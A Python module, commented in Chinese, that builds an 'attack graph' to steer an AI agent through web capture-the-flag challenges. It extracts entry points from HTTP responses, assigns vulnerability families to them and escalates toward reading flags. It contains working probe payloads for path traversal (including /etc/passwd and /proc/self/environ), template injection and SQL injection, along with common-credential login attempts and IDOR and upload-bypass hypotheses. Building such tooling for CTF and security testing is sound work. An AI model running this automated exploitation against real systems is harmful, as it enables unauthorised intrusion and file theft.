"""攻击图：把「下一步干什么」从模型手里拿走。

## 为什么要有这个模块

旧实现里 `playbook.propose()` 生成的全是**端口级静态清单**——「查 robots.txt」
「查登录页」「查 /admin」。它跟已经发现的东西没有任何关系，每道题的前 20 步长得
一模一样。实测三连败都是同一个症状：

- a-04 第 10 步拿到 `uid=33(www-data)`，候选里没有一条跟这台 shell 相关，
  模型回头去测 404 的 `shell.php` / `cmd.php`，8 步烧完。
- a-05 已登录并抓出 `/download.php?id=CONTRACT-2024-001.pdf`，候选里依旧没有
  这个入口，模型 20 步都在枚举字典猜的 `approve.php` / `admin.php`。
- a-03 拿到「/login 恒 500 + 业务路由全 302」，同样只能靠模型自己想。

根因不是提示词写得不细，是**决策结构**错了：模型在无限动作空间里做无状态马尔可夫
决策，每步只看最近 3 条观测。它没有「我在哪、这个入口验证到哪一步、还剩什么没试」
的概念。往这种结构上继续加规则，只能是穷举。

## 这个模块怎么改

artex 里那套「意图-事实-发现血缘」落到这里就是一张有向图：

    节点 = 具体入口（method + path + 参数）  /  能力（file_read / rce / auth）
    边   = (入口, 漏洞族) 的待验证假设，带 payload 模板 + 成功判据

每步不再问「你想干什么」，而是：

    1. 从图里取优先级最高的**待验证边**
    2. 用确定性代码把它渲染成一条 shell 命令（一族 payload 一次打完，步数成本 1）
    3. 执行结果回写图：worked → 新增能力节点，并派生出新的边；failed → 关掉这条分支
    4. 图里没有待验证边了，才把控制权交回模型

关键区别在**边的生成由事实驱动**：只有发现 `?id=` 的值是 `.pdf`，才会生成 LFI 边；
只有拿到 `file_read`，才会生成「用这个入口去读 /challenge/flag.txt」的边。所以
不会重复、不会跑偏，也不是把 payload 表穷举一遍完事。
"""
from __future__ import annotations

import re
from dataclasses import dataclass, field

# ---------------------------------------------------------------- 参数类型

# 参数名 → 语义。名字比值更可靠：`?id=CONTRACT-2024-001.pdf` 里 id 是标识，
# 但值是文件名，说明服务端拿它当路径用——这种要按 file 处理。
FILE_PARAM_NAMES = (
    "file", "filename", "filepath", "path", "doc", "document", "download",
    "src", "source", "template", "tpl", "page", "include", "load", "read",
    "attachment", "attach", "img", "image", "name", "id",
)
SEARCH_PARAM_NAMES = (
    "q", "query", "search", "keyword", "keywords", "kw", "s", "term", "filter",
    "title", "name", "msg", "message", "content", "text", "input",
)
REDIRECT_PARAM_NAMES = ("next", "redirect", "url", "return", "to", "target", "dest", "goto")
ID_PARAM_NAMES = ("id", "uid", "user_id", "userid", "pid", "aid", "cid", "no", "num")

FILE_EXT_RE = re.compile(
    r"\.(pdf|txt|docx?|xlsx?|pptx?|zip|tar|gz|rar|7z|png|jpe?g|gif|svg|"
    r"csv|json|xml|ya?ml|log|bak|conf|ini|sql|db|md|html?|php|jsp|asp)$", re.I)

# ---------------------------------------------------------------- 数据结构


@dataclass
class Entry:
    """一个具体入口。这是图上唯一值得花步数去扩展的东西。"""
    method: str
    path: str
    params: dict[str, str] = field(default_factory=dict)   # 参数名 → 类型
    auth: str = "unknown"        # unknown / ok / denied
    source: str = ""             # 从哪发现的：href / form / route / probe
    has_upload: bool = False
    status: int | None = None

    @property
    def key(self) -> str:
        names = ",".join(sorted(self.params))
        return f"{self.method.upper()}:{self.path}" + (f"?{names}" if names else "")

    def line(self) -> str:
        bits = [f"{self.method.upper()} {self.path}"]
        if self.params:
            bits.append("参数: " + ", ".join(f"{k}({v})" for k, v in self.params.items()))
        if self.auth != "unknown":
            bits.append(f"鉴权={self.auth}")
        if self.has_upload:
            bits.append("含上传表单")
        return " | ".join(bits)


@dataclass
class Capability:
    """已经拿到的能力。拿到能力后，后续动作应该优先复用它的入口，而不是重新挖。"""
    kind: str          # rce / file_read / auth / db
    via: str           # 通过哪个 entry key（或 "session"）
    detail: str = ""

    @property
    def key(self) -> str:
        return f"{self.kind}@{self.via}"


@dataclass
class Edge:
    """一条待验证假设：(入口, 漏洞族)。"""
    family: str
    entry: Entry | None        # None 表示全局动作（如 flag_hunt）
    payload_note: str = ""
    state: str = "pending"     # pending / worked / failed
    attempts: int = 0
    why: str = ""

    @property
    def key(self) -> str:
        return f"{self.family}@{self.entry.key if self.entry else 'global'}"

    def line(self) -> str:
        where = self.entry.key if self.entry else "全局"
        return f"{self.family} @ {where} — {self.why}"


# ---------------------------------------------------------------- 入口解析

HREF_RE = re.compile(r"""(?:href|action|src)\s*=\s*["']([^"'#]+)["']""", re.I)
FORM_RE = re.compile(r"<form\b([^>]*)>(.*?)</form>", re.I | re.S)
INPUT_RE = re.compile(r"""<input\b[^>]*\bname\s*=\s*["']([^"']+)["'][^>]*>""", re.I)
UPLOAD_RE = re.compile(r"""type\s*=\s*["']file["']""", re.I)
METHOD_RE = re.compile(r"""method\s*=\s*["'](\w+)["']""", re.I)
ABS_URL_RE = re.compile(r"""https?://[^\s"'<>)]+""")


def classify_param(name: str, value: str = "") -> str:
    """判断参数该按什么语义打。名字优先，值用来兜底（id 的值是 .pdf 时按 file）。"""
    low = (name or "").lower()
    if FILE_EXT_RE.search(value or "") and low in FILE_PARAM_NAMES:
        return "file"
    if low in REDIRECT_PARAM_NAMES:
        return "redirect"
    if low in SEARCH_PARAM_NAMES:
        return "search"
    if low in ID_PARAM_NAMES:
        return "id"
    if FILE_EXT_RE.search(value or ""):
        return "file"
    if low in FILE_PARAM_NAMES:
        return "file"
    return "generic"


def extract_entries(text: str, base_path_prefix: str = "") -> list[Entry]:
    """从响应文本里抽出所有可操作入口。

    只认响应里真实出现过的 URL——这是「事实驱动」的底线。字典猜出来的路径不在
    这里，它们要么被 bulk_probe 一次性验证过，要么根本不值得花步数。
    """
    body = text or ""
    out: dict[str, Entry] = {}

    def _add(method: str, raw: str, params: dict[str, str],
             source: str, has_upload: bool = False) -> None:
        path = raw
        query = ""
        if "?" in path:
            path, query = path.split("?", 1)
        # 绝对 URL 只留 path 部分，主机以后统一用 context.base_url
        if path.startswith("http://") or path.startswith("https://"):
            match = re.match(r"https?://[^/]+(/?.*)", path)
            path = (match.group(1) if match else "/") or "/"
        if not path.startswith("/"):
            if not path:
                return
            path = "/" + path
        if len(path) > 120 or "*" in path or "{" in path:
            return
        merged = dict(params)
        for pair in query.split("&"):
            if "=" in pair:
                pname, _, pvalue = pair.partition("=")
                merged.setdefault(pname, classify_param(pname, pvalue))
        # 同一个 (method, path) 只留一个节点：先是 href 抽到不带参数的，
        # 后是 form 抽到带参数的，若按 entry.key 去重会变成两个节点互相覆盖，
        # 参数语义就丢了（a-05 的 id=*.pdf 正是这样被判成 generic 的）。
        sig = f"{method.upper()}:{path}"
        existing = out.get(sig)
        if existing is not None:
            for pname, kind in merged.items():
                existing.params.setdefault(pname, kind)
            if has_upload:
                existing.has_upload = True
            return
        entry = Entry(method=method.upper(), path=path, params=merged,
                      source=source, has_upload=has_upload)
        out[sig] = entry

    # 1) form：method/action/input 一起看，能拿到参数名和上传能力
    for match in FORM_RE.finditer(body):
        attrs, inner = match.group(1), match.group(2)
        action = ""
        act = re.search(r"""action\s*=\s*["']([^"']*)["']""", attrs, re.I)
        if act:
            action = act.group(1).strip() or base_path_prefix or "/"
        method = "POST"
        mm = METHOD_RE.search(attrs)
        if mm:
            method = mm.group(1).upper()
        params: dict[str, str] = {}
        for pname in INPUT_RE.findall(inner):
            params[pname] = classify_param(pname)
        if action:
            _add(method, action, params, "form", bool(UPLOAD_RE.search(inner)))

    # 2) href / action / src：带查询串的优先，那才是可注入面
    for raw in HREF_RE.findall(body):
        if raw.lower().startswith(("mailto:", "javascript:", "tel:")):
            continue
        if raw.startswith("http"):
            _add("GET", raw, {}, "link")
        else:
            _add("GET", raw, {}, "link")

    return [e for e in out.values() if e.path not in ("/", "", "#")]


# ---------------------------------------------------------------- 边派生

# 各族 payload。每条边渲染时一次打完，步数成本 1——这是「一步一族」的落点。
LFI_PAYLOADS = (
    "../../../../etc/passwd",
    "../../../../challenge/flag.txt",
    "../../../../flag.txt",
    "../../../../flag",
    "../../../../root/flag.txt",
    "../../../../proc/self/environ",
    "....//....//....//etc/passwd",
)
SSTI_PAYLOADS = ("{{7*7}}", "{{7*'7'}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "{{config}}")
SQLI_PAYLOADS = ("'", "''", "\\", "' OR '1'='1", "1' AND '1'='2", "1 AND 1=1", "1 AND 1=2")
IDOR_IDS = ("0", "1", "2", "3", "-1", "99999")
REDIRECT_PAYLOADS = ("http://example.com/", "//example.com/", "/\\example.com/")

# 成功判据（只看真实字节，不看模型自述）
LFI_PROOF = re.compile(r"root:x:0:0:|flag\{", re.I)
SSTI_PROOF = re.compile(r"\b49\b")
SQLI_ERROR = re.compile(
    r"SQL syntax|mysql_fetch|Warning: mysqli|ORA-\d{4}|SQLite3?::|"
    r"unclosed quotation|quoted string not properly terminated|Sequelize|"
    r"PG::SyntaxError|syntax error at or near", re.I)
FLAG_RE = re.compile(r"flag\{[0-9a-zA-Z_\-]{6,}\}", re.I)
AUTH_OK_STATUS = (200, 301, 302)


def derive(entry: Entry) -> list[Edge]:
    """从一个入口派生该试哪些族。派生条件全部来自入口自身的属性，不是穷举。"""
    edges: list[Edge] = []
    kinds = set(entry.params.values())
    names = {n.lower() for n in entry.params}

    # 登录表单：先拿一个普通账号的会话再说。没有这一步，后面所有需要登录的
    # 入口都会被打成 302，然后被误判成「这条族不存在」直接关掉。
    has_user = bool(names & {"username", "user", "email", "account", "uname", "login"})
    has_pass = bool(names & {"password", "pass", "pwd", "passwd"})
    if entry.method.upper() == "POST" and has_user and has_pass:
        edges.append(Edge("auth", entry, why="登录表单：先用少量常见凭据拿会话"))

    if "file" in kinds:
        edges.append(Edge("lfi", entry,
                          why="参数值是文件名/路径，服务端大概率直接拼路径读文件"))
    if "search" in kinds:
        edges.append(Edge("ssti", entry, why="搜索/展示类参数常被模板二次渲染"))
        edges.append(Edge("sqli", entry, why="搜索参数是 SQL 注入最常见的落点"))
    if "id" in kinds:
        edges.append(Edge("idor", entry, why="按 id 取资源，换 id 看有没有越权"))
    if "redirect" in kinds:
        edges.append(Edge("open_redirect", entry, why="跳转参数未校验时可用于钓鱼/绕过"))
    if entry.has_upload:
        edges.append(Edge("upload_bypass", entry,
                          why="存在文件上传表单，试扩展名与 .htaccess 绕过"))
    return edges


# ---------------------------------------------------------------- 图


class AttackGraph:
    """攻击图。所有状态集中在这里，模型只看到它的文本投影。"""

    def __init__(self) -> None:
        self.entries: dict[str, Entry] = {}
        self.edges: dict[str, Edge] = {}
        self.caps: dict[str, Capability] = {}
        self.closed: set[str] = set()      # 已确定失败的边，不再派发

    # ---- 写入 ----

    def add_entries(self, entries: list[Entry]) -> list[Entry]:
        """新入口入图，并为它派生出待验证边。返回真正新增的那些。"""
        fresh: list[Entry] = []
        for entry in entries:
            if entry.key in self.entries:
                old = self.entries[entry.key]
                # 已知入口补充信息：参数类型/上传能力可能从别的页面才发现
                if entry.has_upload:
                    old.has_upload = True
                for name, kind in entry.params.items():
                    old.params.setdefault(name, kind)
                continue
            self.entries[entry.key] = entry
            fresh.append(entry)
            for edge in derive(entry):
                self.edges.setdefault(edge.key, edge)
        return fresh

    def add_capability(self, kind: str, via: str, detail: str = "") -> list[Edge]:
        """拿到能力后派生后续边。这是「拿到 RCE 就别再挖洞、直接找 flag」的机制化。"""
        cap = Capability(kind=kind, via=via, detail=detail)
        if cap.key in self.caps:
            return []
        self.caps[cap.key] = cap
        created: list[Edge] = []
        if kind in ("rce", "file_read"):
            # 把来源入口挂到 flag_hunt 边上，渲染时直接复用它的参数与路径，
            # 不用再去全局表里反查——「拿到 file_read 就用同一个入口读 flag」。
            target = self.entries.get(via)
            hunt = Edge("flag_hunt", target,
                        why=f"已具备 {kind}（via {via}），直接取 flag")
            created.append(hunt)
            for e in created:
                self.edges.setdefault(e.key, e)
        if kind == "auth":
            # 登录成功后，之前因未登录而失败的入口要重新派发。注意旧边已经是
            # failed 状态，setdefault 不会覆盖，必须显式替换成一条新的 pending 边。
            for entry in self.entries.values():
                if entry.auth != "denied":
                    continue
                entry.auth = "ok"
                for edge in derive(entry):
                    old = self.edges.get(edge.key)
                    if old is not None and old.state == "failed":
                        self.edges[edge.key] = edge
                    else:
                        self.edges.setdefault(edge.key, edge)
                    self.closed.discard(edge.key)
        return created

    def close(self, edge: Edge) -> None:
        edge.state = "failed"
        self.closed.add(edge.key)

    def mark_worked(self, edge: Edge) -> None:
        edge.state = "worked"

    # ---- 读取 ----

    def pending(self) -> list[Edge]:
        out = [e for e in self.edges.values()
               if e.state == "pending" and e.key not in self.closed]
        # flag_hunt 永远最高：已经能读文件/执行命令了，继续挖洞是纯浪费。
        # recon 永远最低：具体边都打不动了才回到侦察摸新面。
        def _rank(edge: Edge) -> int:
            if edge.family == "flag_hunt":
                return 0
            if edge.family == "recon":
                return 2
            return 1
        out.sort(key=lambda e: (_rank(e), e.attempts))
        return out

    def next_edge(self) -> Edge | None:
        items = self.pending()
        return items[0] if items else None

    def ensure_recon(self) -> Edge:
        """图上没有可打的具体边时，给一条「重新摸面」的边。

        这是图的自愈能力，也是它和「一次性清单」的本质区别：某个族的边全打空后，
        图不是就此停摆，而是回到侦察，用新的路径集合再长一批入口。旧实现没有
        这一步，图一空就退化成模型原地重复（实测 a-05 图跑：step 4-12 全在重复
        同一条 curl）。
        """
        return Edge("recon", None, why="图上的边都打空了，重新摸一遍面")

    def has_cap(self, kind: str) -> bool:
        return any(c.kind == kind for c in self.caps.values())

    def cap_via(self, kind: str) -> str | None:
        for c in self.caps.values():
            if c.kind == kind:
                return c.via
        return None

    def stats(self) -> dict:
        return {
            "entries": len(self.entries),
            "edges": len(self.edges),
            "pending": len([e for e in self.edges.values() if e.state == "pending"]),
            "worked": len([e for e in self.edges.values() if e.state == "worked"]),
            "failed": len(self.closed),
            "caps": len(self.caps),
        }

    def snapshot(self, limit: int = 16) -> str:
        """给模型看的文本投影。重点是把「还剩什么没试」摆明，而不是罗列历史。"""
        lines: list[str] = []
        if self.entries:
            lines.append("入口（图上的节点）：")
            for entry in list(self.entries.values())[:limit]:
                lines.append(f"  - {entry.line()}")
        if self.caps:
            lines.append("已获得能力：")
            for cap in self.caps.values():
                lines.append(f"  - {cap.kind}（via {cap.via}）{cap.detail}")
        pend = self.pending()
        if pend:
            lines.append("待验证假设（代码会按优先级自己打，你也可以指定先打哪条）：")
            for edge in pend[:limit]:
                lines.append(f"  - {edge.line()}")
        elif not self.entries:
            lines.append("（图还是空的：先摸清有哪些服务与入口）")
        # 已关闭的边也要给模型看：否则它会去重复图已经证明无效的方向。
        dead = [e for e in self.edges.values()
                if e.state in ("failed", "worked") and e.family != "recon"]
        if dead:
            lines.append("已经打过（别再重复）：")
            for edge in dead[:limit]:
                mark = "✓成功" if edge.state == "worked" else "✗失败"
                lines.append(f"  - {mark} {edge.family} @ "
                             f"{edge.entry.key if edge.entry else 'global'}")
        return "\n".join(lines) if lines else "（空）"
